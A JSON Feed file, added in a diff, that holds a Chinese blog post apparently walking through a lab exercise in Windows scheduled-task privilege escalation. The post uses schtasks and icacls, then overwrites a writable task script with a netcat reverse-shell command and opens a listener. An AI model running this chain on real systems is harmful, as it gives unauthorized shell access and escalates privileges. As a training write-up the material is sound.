@@ -1,0 +1,18 @@
+{
+    "version": "https://jsonfeed.org/version/1",
+    "title": "K1t0 • All posts by \"windwos提权\" category",
+    "description": "一点小分享",
+    "home_page_url": "https://k1t0111.github.io",
+    "items": [
+        {
+            "id": "https://k1t0111.github.io/2024/03/09/windows/",
+            "url": "https://k1t0111.github.io/2024/03/09/windows/",
+            "title": "windows-计划任务提权",
+            "date_published": "2024-03-09T09:28:35.000Z",
+            "content_html": "<p><img data-src=\"https://img2.imgtp.com/2024/03/09/RHPXj7nO.png\" alt=\"\" /></p>\n<h1 id=\"阅读须知\"><a class=\"anchor\" href=\"#阅读须知\">#</a> 阅读须知：</h1>\n<blockquote>\n<p>探索者安全团队技术文章仅供参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作，由于传播、利用本公众号所提供的技术和信息而造成的任何直接或者间接的后果及损失，均由使用者<br />\n本人负责，作者不为此承担任何责任，如有侵权烦请告知，我们会立即删除并致歉，创作不易转载请标明出处。感谢！</p>\n</blockquote>\n<h1 id=\"介绍\"><a class=\"anchor\" href=\"#介绍\">#</a> 介绍</h1>\n<blockquote>\n<p>个人理解 windows 计划任务有很多，如果我们能够更改计划任务的.bat 文件 将他修改成我们需要的内容 就可以获取相应执行者权限，可以用来横向和纵向提权</p>\n</blockquote>\n<h1 id=\"查看计划任务\"><a class=\"anchor\" href=\"#查看计划任务\">#</a> 查看计划任务</h1>\n<blockquote>\n<p>schtasks 是 windwos 的查看计划任务的工具</p>\n</blockquote>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>schtasks /query  /tn  计划任务名字 /fo list /v</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>/fo list /v  是详细列出计划任务并且详细表示<span class=\"token operator\">!</span><span class=\"token punctuation\">[</span>alt text<span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span>https://img2.imgtp.com/2024/03/09/bIhyRBZt.png<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>例如我们查看到 名字为 vulntask 文件名字的计划任务如下的计划任务<br />\n<img data-src=\"https://img2.imgtp.com/2024/03/09/6XYOTwOf.png\" alt=\"\" /><br />\n从中可以知道运行的脚本 以及 作者 和 运行的用户 是谁<br />\n可以看到是 taskusr1 那么我们就或许可以横向到 这个用户</p>\n</blockquote>\n<h1 id=\"权限\"><a class=\"anchor\" href=\"#权限\">#</a> 权限</h1>\n<blockquote>\n<p>首先看脚本文件的权限<br />\n icacls 文件<br />\n icacls C:\\tasks\\schtask.bat<br />\n<img data-src=\"https://img2.imgtp.com/2024/03/09/bIhyRBZt.png\" alt=\"\" /><br />\n 可以看到我们有 F 读写执行完全的权限，只要有这个权限我们完全可以写入 反向连接 shell<br />\nBUILTIN\\Users:(I)(F)：这表示内置用户组 &quot;Users&quot; 对该文件拥有读取和完全控制的权限。<br />\nNT AUTHORITY\\SYSTEM:(I)(F)：这表示系统用户拥有对该文件的读取和完全控制权限。<br />\nBUILTIN\\Administrators:(I)(F)：这表示内置管理员组拥有对该文件的读取和完全控制权限。<br />\n在这里，括号中的 (I) 代表 &quot;继承&quot;，(F) 代表 &quot;完全控制&quot;。</p>\n</blockquote>\n<h1 id=\"提权\"><a class=\"anchor\" href=\"#提权\">#</a> 提权</h1>\n<blockquote>\n<p>在这个靶机上我们可以看到 已经存在 nc<br />\n<img data-src=\"https://img2.imgtp.com/2024/03/09/Zhrb2SlU.png\" alt=\"\" /><br />\n 直接写入 echo c:/tools/nc64.exe ip 端口 -e cmd.exe &gt; C:\\tasks\\schtask.bat<br />\n 然后开启监听 nc -nvlp 端口就可以横向提权到 taskusr1</p>\n</blockquote>\n",
+            "tags": [
+                "windows"
+            ]
+        }
+    ]
+}
